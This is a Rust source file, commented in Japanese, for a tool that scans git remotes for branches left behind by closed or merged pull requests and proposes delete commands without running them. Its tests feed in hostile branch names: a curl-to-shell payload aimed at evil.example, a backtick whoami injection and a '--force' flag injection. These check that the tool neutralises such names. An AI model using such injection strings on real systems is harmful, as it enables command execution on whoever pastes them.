//! クローズ済み / マージ済み PR の残存ブランチを検出し、削除を**提案**する (順位 395)。
//!
//! # 使い方
//!
//! ```text
//! cli-stale-branch-scan [--remote <name|url>] [--repo <owner/name>] [--prefix <p>] [--deletable-only]
//! ```
//!
//! `--prefix` は走査対象を絞る (例: `claude/nightly-`)。**PR の問い合わせ前**に効くので
//! `gh` の呼び出し回数も減る。`--deletable-only` は markdown ではなく**削除候補のブランチ名を
//! 1 行 1 件**で出す機械可読モードで、`nightly-todo.yml` の掃除 step が消費する。
//!
//! # なぜ takt workflow の中に置かないか
//!
//! 検出には `git ls-remote` と `gh pr list` = **ネットワークが要る**。一方
//! [`weekly-review.yaml`](../../../.takt/workflows/weekly-review.yaml) は全 provider に
//! `network_access: false` を課しており (他 3 workflow は `true`)、whole-tree review 6 facet を
//! オフラインで走らせる隔離が設計の一部になっている。本 scan のためにこれを反転すると
//! **6 facet すべての隔離が緩む**ため、[ADR-031](../../../docs/adr/adr-031-weekly-review-pipeline.md)
//! の 3 層分離 (機械 / takt AI / skill ask) のうち**機械層**に、takt の外側の exe として置く。
//! `/monthly-review` が `cli-telemetry-report` を同期実行するのと同じ形。
//!
//! # 削除はしない
//!
//! 本 exe は**提案までで止まる** ([ADR-022](../../../docs/adr/adr-022-automation-responsibility-separation.md) /
//! [ADR-028](../../../docs/adr/adr-028-pnpm-create-pr-gate.md))。出力に含めるのは
//! **人間がそのまま貼れる削除コマンド**であって、実行はしない。
//!
//! **削除する呼び手が 1 つだけある。** [ADR-052](../../../docs/adr/adr-052-autonomy-execution-boundary-classes.md)
//! の 2026-08-16 改訂で「自分が作った `claude/**` ブランチのうち PR が紐づくものの削除」が
//! 自動実行可クラスに入り、`nightly-todo.yml` の掃除 step が `--deletable-only` の出力を
//! 消費して削除する ([ADR-072](../../../docs/adr/adr-072-nightly-todo-loop.md) 決定 20)。
//! **判定と実行の分離は保たれている** — 本 exe は「消してよい」を決めるだけで、消すのは呼び手。
//! `BranchVerdict::NoPullRequest` を候補にしない既存の規則が、そのまま夜間ループの
//! 失敗マーカー (PR の無い `claude/nightly-<順位>`) を守る。
//!
//! # 出力に wall-clock を含めない理由
//!
//! 同じリポジトリ状態なら**同じ出力**になるようにしてある。週次で前回分と diff を取り
//! 「今週新たに浮いたブランチ」だけを読むのが本来の使い方で、時刻を混ぜると毎回全行が
//! 差分として出る。実行時刻は呼び手 (skill / weekly report) が記録する。
//!
//! # exit コード
//!
//! - `0` = scan 成功 (候補の有無は問わない)
//! - `1` = 取得失敗 (fail-closed。**0 件と報告しない**)
//! - `2` = 引数不正

mod classify;
mod collect;

use classify::{BranchVerdict, ClassifiedBranch};

const USAGE: &str = "usage: cli-stale-branch-scan [--remote <name|url>] [--repo <owner/name>] \
     [--prefix <p>] [--deletable-only]";
const DEFAULT_REMOTE: &str = "origin";

struct Cli {
    remote: String,
    repo: Option<String>,
    /// 走査対象のブランチ名 prefix。PR 問い合わせ前に絞るので `gh` 呼び出しも減る。
    prefix: Option<String>,
    /// markdown ではなく削除候補のブランチ名を 1 行 1 件で出す。
    deletable_only: bool,
}

/// 値を取る flag の次トークンを取り出す。**別の flag は値として受け取らない。**
///
/// 素朴に「次のトークン」を値にすると `--prefix --deletable-only` が
/// 「prefix = `--deletable-only`」と解釈され、`deletable_only` は false のまま
/// **markdown レポートが出る**。呼び手はそれを削除候補の一覧として読むため、
/// 誤りが「引数不正」ではなく「別モードの正常出力」に化ける。値の欠落として弾く
/// (CodeRabbit [#412](https://github.com/aloekun/claude-code-hook-test/pull/412))。
fn take_value(argv: &[String], index: usize, flag: &str) -> Result<String, String> {
    match argv.get(index) {
        Some(value) if !value.starts_with("--") => Ok(value.clone()),
        Some(value) => Err(format!(
            "{flag} の値が別のオプションになっています: {value:?}\n{USAGE}"
        )),
        None => Err(format!("{flag} の値がありません\n{USAGE}")),
    }
}

fn parse_args(argv: &[String]) -> Result<Cli, String> {
    let mut remote = DEFAULT_REMOTE.to_string();
    let mut repo = None;
    let mut prefix = None;
    let mut deletable_only = false;
    let mut i = 0;
    while i < argv.len() {
        let flag = argv[i].as_str();
        match flag {
            "--prefix" => {
                prefix = Some(take_value(argv, i + 1, flag)?);
                i += 2;
            }
            "--deletable-only" => {
                deletable_only = true;
                i += 1;
            }
            "--remote" => {
                remote = take_value(argv, i + 1, flag)?;
                i += 2;
            }
            "--repo" => {
                repo = Some(take_value(argv, i + 1, flag)?);
                i += 2;
            }
            other => return Err(format!("不明な引数: {other:?}\n{USAGE}")),
        }
    }
    if remote.is_empty() {
        return Err(format!("--remote は空にできません\n{USAGE}"));
    }
    if prefix.as_deref() == Some("") {
        return Err(format!("--prefix は空にできません\n{USAGE}"));
    }
    Ok(Cli {
        remote,
        repo,
        prefix,
        deletable_only,
    })
}

fn main() {
    let argv: Vec<String> = std::env::args().skip(1).collect();
    let cli = match parse_args(&argv) {
        Ok(cli) => cli,
        Err(message) => {
            eprintln!("[stale-branch-scan] {message}");
            std::process::exit(2);
        }
    };
    lib_jj_helpers::inject_git_dir_for_gh(|message| eprintln!("[stale-branch-scan] {message}"));
    let branches = match collect::fetch_remote_branches(&cli.remote) {
        Ok(branches) => branches,
        Err(message) => fail(&message),
    };
    let branches = filter_by_prefix(branches, cli.prefix.as_deref());
    let prs = match collect::fetch_pull_requests_for(&branches, cli.repo.as_deref()) {
        Ok(prs) => prs,
        Err(message) => fail(&message),
    };
    let configured_trunk = configured_trunk_branch();
    let classified = classify::classify(&branches, &prs, configured_trunk.as_deref());
    if cli.deletable_only {
        print!("{}", render_deletable(&classified));
        return;
    }
    print!("{}", render(&classified, &cli.remote));
}

fn filter_by_prefix(branches: Vec<String>, prefix: Option<&str>) -> Vec<String> {
    let Some(prefix) = prefix else {
        return branches;
    };
    branches.into_iter().filter(|b| b.starts_with(prefix)).collect()
}

/// 削除候補のブランチ名だけを 1 行 1 件で返す (機械可読モード)。
///
/// **名前が [`is_safe_branch_name`] を満たさないものは出さない。** 呼び手 (`nightly-todo.yml`)
/// はこの出力を `git push origin --delete "$branch"` の引数に使うため、markdown レポートの
/// コピペ経路と同じ injection 面がある。危険な名前は候補から落とし、落とした事実を stderr へ
/// 出す — 黙って落とすと「掃除されないブランチがある」ことに誰も気づけない。
fn render_deletable(classified: &[ClassifiedBranch]) -> String {
    let mut out = String::new();
    for branch in classify::deletion_candidates(classified) {
        if is_safe_branch_name(&branch.branch) {
            out.push_str(&branch.branch);
            out.push('\n');
            continue;
        }
        eprintln!(
            "[stale-branch-scan] 削除候補ですが名前に使用できない文字があるため出力しません \
             (人間が確認してください): {:?}",
            branch.branch
        );
    }
    out
}

fn fail(message: &str) -> ! {
    eprintln!("[stale-branch-scan] 取得に失敗したため中断します: {message}");
    eprintln!("[stale-branch-scan] 不完全な一覧で削除提案を出さないための停止です (0 件ではありません)");
    std::process::exit(1)
}

/// `push-runner-config.toml` のトップレベル `default_branch` と、それが未設定の場合に
/// フォールバック先となる section override (`[diff]` / `[docs_only_routing]` /
/// `[pr_size_check]`) を読む最小 struct。他のフィールドは無視する (serde 既定の
/// unknown-field 許容)。
#[derive(serde::Deserialize)]
struct TrunkConfig {
    default_branch: Option<String>,
    diff: Option<TrunkSectionOverride>,
    docs_only_routing: Option<TrunkSectionOverride>,
    pr_size_check: Option<TrunkSectionOverride>,
}

/// section 側の `default_branch` override だけを読む最小 struct。
#[derive(serde::Deserialize)]
struct TrunkSectionOverride {
    default_branch: Option<String>,
}

/// branch 名を trim し、空文字を `None` に落とす (空白のみの設定値を未設定扱いにする)。
///
/// `cli-push-runner` `config::normalize_branch` と同じ規則。
fn normalize_branch(value: Option<&str>) -> Option<String> {
    value.map(str::trim).filter(|s| !s.is_empty()).map(str::to_string)
}

impl TrunkConfig {
    /// top-level `default_branch` が明示されていればそれ。無ければ `[diff]` /
    /// `[docs_only_routing]` / `[pr_size_check]` の override 群が**全て一致**していれば
    /// その値を返す。`cli-push-runner` `config::Config::effective_default_branch()`
    /// (config/mod.rs) と同じ優先順位をミラーする。
    ///
    /// このリポジトリの `push-runner-config.toml` は top-level `default_branch` を
    /// コメントアウトし `[pr_size_check]` / `[docs_only_routing]` の override だけで
    /// trunk 名を揃える構成であり、top-level だけを読むと `None` に落ちて
    /// `is_protected()` がそれを trunk と認識できなかった
    /// (SIM-NEW-cli-stale-branch-scan-main-L121)。
    fn effective_default_branch(&self) -> Option<String> {
        if let Some(top) = normalize_branch(self.default_branch.as_deref()) {
            return Some(top);
        }
        let overrides: Vec<String> = [
            self.diff.as_ref().and_then(|c| c.default_branch.as_deref()),
            self.docs_only_routing.as_ref().and_then(|c| c.default_branch.as_deref()),
            self.pr_size_check.as_ref().and_then(|c| c.default_branch.as_deref()),
        ]
        .into_iter()
        .filter_map(normalize_branch)
        .collect();
        let first = overrides.first()?;
        overrides.iter().all(|v| v == first).then(|| first.clone())
    }
}

/// `push-runner-config.toml` の `default_branch` (top-level またはフォールバック解決後の
/// section override) を追加の保護対象 trunk 名として読む。
///
/// [`classify::is_protected`] は `lib_jj_helpers::TRUNK_BOOKMARKS` (`main`/`master`/`trunk`/
/// `develop`) を既定で保護するが、リポジトリが `default_branch` にそれ以外の名前を設定して
/// いる場合はそれも trunk であり、削除提案に載せてはならない
/// (SIM-NEW-cli-stale-branch-scan-classify-L283)。
///
/// 本 exe は push-runner とは独立した機械層 (module doc 参照) であり、
/// `push-runner-config.toml` を必須入力としない。ファイルが無い / cwd に無い / パース失敗 /
/// `default_branch` 解決不能のいずれでも `None` を返し、`TRUNK_BOOKMARKS` による保護のみで
/// 継続する (fail-closed にはしない。本ファイルの欠如は「除外リポジトリ」ではなく
/// 「push-runner 未導入の派生リポジトリ」でも起こり得るため)。
fn configured_trunk_branch() -> Option<String> {
    let content = std::fs::read_to_string("push-runner-config.toml").ok()?;
    parse_configured_trunk_branch(&content)
}

/// [`configured_trunk_branch`] のファイル IO を切り離した純粋関数。cwd に依存せずテストできる。
fn parse_configured_trunk_branch(content: &str) -> Option<String> {
    let config: TrunkConfig = toml::from_str(content).ok()?;
    config.effective_default_branch()
}

/// markdown レポートを組み立てる。
///
/// 3 section とも**件数 0 でも必ず出す**。「候補 0 件」と「section ごと出なかった」を
/// 読み手が区別できるようにするため (file-length-watchlist と同じ約束)。
fn render(classified: &[ClassifiedBranch], remote: &str) -> String {
    let mut out = header(remote);
    out.push_str(&proposal_section(classified, remote));
    out.push_str(&section(
        "## 参考: open PR が生きているブランチ (対象外)",
        classified,
        |verdict| match verdict {
            BranchVerdict::Active { open_prs } => {
                Some(open_prs.iter().map(|n| format!("#{n}")).collect::<Vec<_>>().join(", "))
            }
            _ => None,
        },
        "PR",
    ));
    out.push_str(&section(
        "## 参考: PR が 1 件も無いブランチ (提案対象外)",
        classified,
        |verdict| matches!(verdict, BranchVerdict::NoPullRequest).then(|| "-".to_string()),
        "備考",
    ));
    out.push_str(
        "> PR の無いブランチを提案対象にしないのは、**まだ PR を開いていない作業中のブランチ**と\n\
         > 区別できないため。放置が気になる場合は人間が個別に判断する。\n",
    );
    out
}

fn header(remote: &str) -> String {
    let mut out = String::from("# Stale Branch Watchlist (機械 scan)\n\n");
    out.push_str(&format!("- remote: `{remote}` / 対象: 全 remote ブランチ (trunk は常に除外)\n"));
    out.push_str("- 判定: 紐づく PR がすべて closed / merged なら削除候補。open が 1 本でもあれば対象外\n");
    out.push_str("- **削除は行いません**。実行するかは人間が決めます (ADR-022 / ADR-028)\n\n");
    out
}

/// 削除コマンドに安全に埋め込める branch 名か判定する。
///
/// remote ブランチ名は `git ls-remote` から得た値で、リポジトリに push 権限を持つ誰か
/// (nightly/cloud harness 自動化を含む、他所で既に prompt injection の脅威主体として
/// 扱われている) が任意の文字列を選べる。git の ref 名規則は `;` `$` `` ` `` `|` `{` `}`
/// を許容し (`${IFS}` を使えばスペース無しでも展開できる) ため、本レポートが「そのまま
/// 貼れる削除コマンド」として `branch` を埋め込む設計 (本 module doc 参照) では、細工した
/// ブランチ名がコピペ実行時に任意コマンドを実行し得る
/// (SEC-NEW-cli-stale-branch-scan-main-L154)。安全な文字集合の allowlist で防ぐ。
fn is_safe_branch_name(branch: &str) -> bool {
    !branch.is_empty()
        && branch
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | '-'))
}

/// ブランチ名を markdown の表セルとして安全に描画する。
///
/// **削除コマンドだけを塞いでも足りない。** 同じブランチ名は「削除提案」表の 1 列目にも、
/// 2 つの参考表にも出る。git の ref 名規則はバッククォートと `|` を許すため
/// (`git check-ref-format` で実測)、素の `` `{branch}` `` は
///
/// - バッククォート → コードスパンを抜け出して任意の markdown を注入できる
/// - `|` → 表の列構造を壊し、行を偽装できる
///
/// [`is_safe_branch_name`] の allowlist を**描画側の全経路で**使い、危険な文字は `?` へ
/// 潰したうえで印を付ける。安全な文字集合を 1 箇所で定義し、出口すべてがそれを通る形に
/// してある (出口ごとに別々の対策を足すと、次に出口が増えたときに同じ穴が空く)。
fn branch_cell(branch: &str) -> String {
    if is_safe_branch_name(branch) {
        return format!("`{branch}`");
    }
    let neutralized: String = branch
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | '-') { c } else { '?' })
        .collect();
    format!("`{neutralized}` ⚠️ 表示不能な文字を `?` に置換")
}

fn proposal_section(classified: &[ClassifiedBranch], remote: &str) -> String {
    let candidates = classify::deletion_candidates(classified);
    let mut out = String::from("## 削除提案 (クローズ済み / マージ済み PR の残存ブランチ)\n\n");
    if candidates.is_empty() {
        out.push_str("- 件数: **0 件 (clean state)**\n\n");
        return out;
    }
    out.push_str(&format!("- 件数: {} 件\n\n", candidates.len()));
    out.push_str("| ブランチ | 紐づく PR | 削除コマンド (手動実行) |\n|---|---|---|\n");
    for candidate in &candidates {
        let BranchVerdict::Stale { closed_prs } = &candidate.verdict else {
            continue;
        };
        let prs = closed_prs.iter().map(|n| format!("#{n}")).collect::<Vec<_>>().join(", ");
        let command_cell = if is_safe_branch_name(&candidate.branch) {
            format!("`git push {remote} --delete -- {}`", candidate.branch)
        } else {
            "⚠️ ブランチ名に不審な文字を含むため削除コマンドの自動生成を省略。手動で確認してください".to_string()
        };
        out.push_str(&format!("| {} | {} | {} |\n", branch_cell(&candidate.branch), prs, command_cell));
    }
    out.push('\n');
    out
}

fn section(
    heading: &str,
    classified: &[ClassifiedBranch],
    extract: impl Fn(&BranchVerdict) -> Option<String>,
    detail_header: &str,
) -> String {
    let rows: Vec<(String, String)> = classified
        .iter()
        .filter_map(|c| extract(&c.verdict).map(|detail| (c.branch.clone(), detail)))
        .collect();
    let mut out = format!("{heading}\n\n");
    if rows.is_empty() {
        out.push_str("- 件数: **0 件**\n\n");
        return out;
    }
    out.push_str(&format!("- 件数: {} 件\n\n", rows.len()));
    out.push_str(&format!("| ブランチ | {detail_header} |\n|---|---|\n"));
    for (branch, detail) in rows {
        out.push_str(&format!("| {} | {detail} |\n", branch_cell(&branch)));
    }
    out.push('\n');
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use classify::{PrRecord, PrState};

    fn args(items: &[&str]) -> Vec<String> {
        items.iter().map(|s| s.to_string()).collect()
    }

    fn pr(number: u64, head: &str, state: &str) -> PrRecord {
        PrRecord { number, head_ref: head.to_string(), state: PrState::parse(state) }
    }

    #[test]
    fn defaults_to_origin_and_no_repo_override() {
        let cli = parse_args(&args(&[])).expect("parse");
        assert_eq!(cli.remote, DEFAULT_REMOTE);
        assert_eq!(cli.repo, None);
    }

    #[test]
    fn flags_are_parsed() {
        let cli = parse_args(&args(&["--remote", "upstream", "--repo", "o/r"])).expect("parse");
        assert_eq!(cli.remote, "upstream");
        assert_eq!(cli.repo.as_deref(), Some("o/r"));
    }

    #[test]
    fn dangling_and_unknown_flags_are_usage_errors() {
        assert!(parse_args(&args(&["--remote"])).is_err());
        assert!(parse_args(&args(&["--repo"])).is_err());
        assert!(parse_args(&args(&["--delete"])).is_err());
        assert!(parse_args(&args(&["--remote", ""])).is_err());
        assert!(parse_args(&args(&["--prefix"])).is_err());
        assert!(parse_args(&args(&["--prefix", ""])).is_err());
    }

    /// 値を取る flag に別の flag が続いたら**引数不正**。素朴に次トークンを値にすると
    /// `--prefix --deletable-only` が「prefix = --deletable-only」と読まれ、
    /// `deletable_only` は false のまま **markdown レポート**が出る。呼び手はそれを
    /// 削除候補の一覧として読むため、誤りが別モードの正常出力に化ける。
    #[test]
    fn a_flag_is_never_consumed_as_another_flags_value() {
        assert!(parse_args(&args(&["--prefix", "--deletable-only"])).is_err());
        assert!(parse_args(&args(&["--remote", "--repo", "o/r"])).is_err());
        assert!(parse_args(&args(&["--repo", "--prefix", "claude/"])).is_err());
    }

    #[test]
    fn the_machine_readable_flags_are_parsed() {
        let cli = parse_args(&args(&["--prefix", "claude/nightly-", "--deletable-only"]))
            .expect("parse");
        assert_eq!(cli.prefix.as_deref(), Some("claude/nightly-"));
        assert!(cli.deletable_only);
        assert!(!parse_args(&args(&[])).expect("parse").deletable_only);
    }

    /// prefix は **PR 問い合わせの前**に効かせる。夜間の掃除は `claude/nightly-*` だけを
    /// 対象にすればよく、無関係なブランチまで 1 本ずつ `gh` を呼ぶ理由がない。
    #[test]
    fn the_prefix_filters_branches_before_they_are_scanned() {
        let branches = vec![
            "claude/nightly-203".to_string(),
            "claude/lane-model-pr4".to_string(),
            "master".to_string(),
        ];
        assert_eq!(
            filter_by_prefix(branches.clone(), Some("claude/nightly-")),
            vec!["claude/nightly-203".to_string()]
        );
        assert_eq!(filter_by_prefix(branches.clone(), None), branches);
    }

    /// 機械可読モードは **Stale だけ**を出す。とりわけ `NoPullRequest` を出さないことが
    /// 夜間ループの失敗マーカー (PR の無い `claude/nightly-<順位>`) を守る一線になる。
    #[test]
    fn the_machine_readable_output_lists_only_branches_whose_prs_are_all_settled() {
        let classified = classify::classify(
            &[
                "claude/nightly-203".to_string(),
                "claude/nightly-228".to_string(),
                "claude/nightly-240".to_string(),
                "claude/nightly-999".to_string(),
            ],
            &[
                pr(1, "claude/nightly-203", "CLOSED"),
                pr(2, "claude/nightly-228", "MERGED"),
                pr(3, "claude/nightly-240", "OPEN"),
            ],
            None,
        );
        let out = render_deletable(&classified);
        assert_eq!(out, "claude/nightly-203\nclaude/nightly-228\n");
        assert!(
            !out.contains("claude/nightly-999"),
            "PR の無いブランチ (失敗マーカー) を削除候補に出している"
        );
        assert!(
            !out.contains("claude/nightly-240"),
            "open PR のブランチを削除候補に出している"
        );
    }

    /// **merged を除外しない** (ADR-072 決定 20)。マージ時にブランチが消し忘れられ、かつ
    /// 台帳の行が残っていると、そのブランチが除外マーカーとして効き続けてその順位が
    /// 永久に選択されなくなる。
    #[test]
    fn a_merged_pr_whose_branch_remains_is_a_deletion_candidate() {
        let classified = classify::classify(
            &["claude/nightly-216".to_string()],
            &[pr(9, "claude/nightly-216", "MERGED")],
            None,
        );
        assert_eq!(render_deletable(&classified), "claude/nightly-216\n");
    }

    /// 呼び手は出力を `git push origin --delete "$branch"` に渡す。危険な文字を含む名前は
    /// 候補から落とす (markdown レポートのコピペ経路と同じ injection 面)。
    #[test]
    fn an_unsafe_branch_name_is_withheld_from_the_machine_readable_output() {
        let hostile = "claude/nightly-1;curl evil".to_string();
        let classified = classify::classify(
            std::slice::from_ref(&hostile),
            &[pr(1, &hostile, "CLOSED")],
            None,
        );
        assert_eq!(render_deletable(&classified), "");
    }

    /// **削除コマンドは提案として出すだけ**。出力に含まれることと、exe が実行しないことは別。
    /// レポートに `git push --delete` の文字列が載ることをここで固定し、同時に
    /// 「削除は行わない」旨の断り書きが必ず添うことも固定する。
    #[test]
    fn a_stale_branch_is_reported_with_a_manual_delete_command() {
        let classified = classify::classify(
            &[
                "claude/nightly-203".to_string(),
                "master".to_string(),
                "feat/live".to_string(),
                "wip/no-pr".to_string(),
            ],
            &[
                pr(365, "claude/nightly-203", "CLOSED"),
                pr(376, "feat/live", "OPEN"),
            ],
            None,
        );
        let report = render(&classified, "origin");
        assert!(report.contains("git push origin --delete -- claude/nightly-203"), "{report}");
        assert!(report.contains("**削除は行いません**"), "{report}");
        assert!(report.contains("#365"), "{report}");
        assert!(!report.contains("--delete master"), "trunk が提案に載ってはならない");
        assert!(!report.contains("--delete feat/live"), "open PR のブランチは提案対象外");
        assert!(!report.contains("--delete wip/no-pr"), "PR 無しは提案対象外");
    }

    /// ブランチ名が `-` で始まる場合、削除コマンドの refspec 位置に `--` セパレータを
    /// 挟んで git のオプションパーサに flag として解釈させない
    /// (SEC-NEW-cli-stale-branch-scan-main-L272: origin へ push 権限を持つ誰かが
    /// `--force` / `--mirror` 等のブランチ名を作ると、セパレータ無しではコピペ実行時に
    /// 攻撃者選択の flag が `git push` に渡ってしまう)。
    #[test]
    fn a_branch_name_starting_with_dash_gets_a_double_dash_separator() {
        let classified = classify::classify(
            &["--force".to_string()],
            &[pr(1, "--force", "CLOSED")],
            None,
        );
        let report = render(&classified, "origin");
        assert!(report.contains("git push origin --delete -- --force"), "{report}");
    }

    /// ブランチ名に shell メタ文字が混ざっている場合、削除コマンドを自動生成しない
    /// (SEC-NEW-cli-stale-branch-scan-main-L154: コピペ実行での任意コマンド実行を防ぐ)。
    #[test]
    fn a_branch_name_with_shell_metacharacters_gets_no_paste_ready_command() {
        let malicious = "x;curl${IFS}evil.example|sh;#";
        let classified = classify::classify(
            &[malicious.to_string()],
            &[pr(1, malicious, "CLOSED")],
            None,
        );
        let report = render(&classified, "origin");
        assert!(!report.contains("git push origin --delete"), "{report}");
        assert!(report.contains("手動で確認してください"), "{report}");
    }

    /// **ブランチ名は 3 つの表すべてで無害化する。** 削除コマンド欄だけを塞いでも、
    /// 同じ名前が 1 列目や参考表にも出るため、バッククォート (コードスパン脱出) と
    /// `|` (表の列構造破壊) がそのまま残る。git は両方を ref 名に許すので
    /// (`git check-ref-format` で実測)、危険文字が**どの section にも生で出ない**ことを
    /// 出口ごとではなく入力空間全体で固める。
    #[test]
    fn dangerous_characters_never_reach_any_table_cell() {
        let stale = "bad`whoami`|row";
        let active = "live`x`|y";
        let no_pr = "orphan`z`|w";
        let classified = classify::classify(
            &[stale.to_string(), active.to_string(), no_pr.to_string()],
            &[pr(1, stale, "CLOSED"), pr(2, active, "OPEN")],
            None,
        );
        let report = render(&classified, "origin");
        assert!(!report.contains('`') || !report.contains("`whoami`"), "{report}");
        for raw in [stale, active, no_pr] {
            assert!(!report.contains(raw), "生のブランチ名 {raw:?} が出力に残っている:\n{report}");
        }
        assert!(report.contains("表示不能な文字"), "置換の印が無い:\n{report}");
        assert!(report.contains("bad?whoami??row"), "識別可能な形で残っていない:\n{report}");
    }

    /// 安全な名前は従来どおりコードスパンで出す (無害化が過剰に効いていないことの対照)。
    #[test]
    fn safe_branch_names_are_rendered_verbatim() {
        assert_eq!(branch_cell("claude/nightly-203"), "`claude/nightly-203`");
        assert_eq!(branch_cell("feat/a_b.c-d"), "`feat/a_b.c-d`");
    }

    /// 候補 0 件でも 3 section すべてを出す。「0 件」と「section ごと欠落」を読み手が
    /// 取り違えないため。
    #[test]
    fn every_section_is_emitted_even_when_empty() {
        let report = render(&classify::classify(&[], &[], None), "origin");
        assert!(report.contains("0 件 (clean state)"), "{report}");
        assert!(report.contains("参考: open PR が生きているブランチ"), "{report}");
        assert!(report.contains("参考: PR が 1 件も無いブランチ"), "{report}");
    }

    /// 同じ入力なら同じ出力 (週次 diff 運用の前提)。wall-clock を混ぜていないことの回帰固定。
    #[test]
    fn the_report_is_byte_identical_for_the_same_input() {
        let classified = classify::classify(
            &["feat/x".to_string()],
            &[pr(1, "feat/x", "MERGED")],
            None,
        );
        assert_eq!(render(&classified, "origin"), render(&classified, "origin"));
    }

    /// top-level `default_branch` が明示されていればそれを使う (section override より優先)。
    #[test]
    fn trunk_branch_prefers_top_level_default_branch() {
        let content = "default_branch = \"main\"\n\n[pr_size_check]\ndefault_branch = \"trunk\"\n";
        assert_eq!(parse_configured_trunk_branch(content).as_deref(), Some("main"));
    }

    /// このリポジトリの実 config と同じ構成: top-level は無く、section override だけで
    /// trunk 名を揃えている。全 section が一致していればそれを trunk として解決する
    /// (SIM-NEW-cli-stale-branch-scan-main-L121 回帰固定)。
    #[test]
    fn trunk_branch_falls_back_to_agreeing_section_overrides() {
        let content = "\
[pr_size_check]
default_branch = \"main\"

[docs_only_routing]
default_branch = \"main\"
";
        assert_eq!(parse_configured_trunk_branch(content).as_deref(), Some("main"));
    }

    /// section override が単独でも解決できる (他 section が未設定でも良い)。
    #[test]
    fn trunk_branch_resolves_from_a_single_section_override() {
        let content = "[diff]\ndefault_branch = \"main\"\n";
        assert_eq!(parse_configured_trunk_branch(content).as_deref(), Some("main"));
    }

    /// section override が食い違う場合は誤った trunk 名を確定させず `None` に倒す
    /// (fail-closed ではなく `TRUNK_BOOKMARKS` のみでの継続に委ねる)。
    #[test]
    fn trunk_branch_is_none_when_section_overrides_disagree() {
        let content = "\
[pr_size_check]
default_branch = \"main\"

[docs_only_routing]
default_branch = \"trunk\"
";
        assert_eq!(parse_configured_trunk_branch(content), None);
    }

    /// top-level も section override も無ければ `None`。
    #[test]
    fn trunk_branch_is_none_when_nothing_is_configured() {
        assert_eq!(parse_configured_trunk_branch("[push]\ncommand = \"jj git push\"\n"), None);
    }

    /// **本リポジトリの実 `push-runner-config.toml` から trunk 名が解決できること。**
    ///
    /// 上の 5 件は合成 TOML で分岐を固めるが、SIM-NEW-cli-stale-branch-scan-main-L121 の
    /// 起点は「**このリポジトリの実 config が section override だけで trunk を決めている**」
    /// という事実だった。合成テストだけでは、実ファイルの構成が将来変わって解決不能に
    /// なっても気づけない (memory: 外部 fixture 参照テストは値まで assert する)。
    ///
    /// cwd 依存のため `--ignored` (ADR-041 / `cargo test -- --ignored --test-threads=1`)。
    #[test]
    #[ignore = "cwd 依存: リポジトリルートの push-runner-config.toml を読む。--test-threads=1 で実行"]
    fn the_real_repo_config_resolves_to_a_trunk_name() {
        let content = std::fs::read_to_string("../../push-runner-config.toml")
            .or_else(|_| std::fs::read_to_string("push-runner-config.toml"))
            .expect("push-runner-config.toml を読めない");
        assert_eq!(
            parse_configured_trunk_branch(&content).as_deref(),
            Some("master"),
            "実 config から trunk 名を解決できない。section override 構成が変わった可能性がある"
        );
    }
}
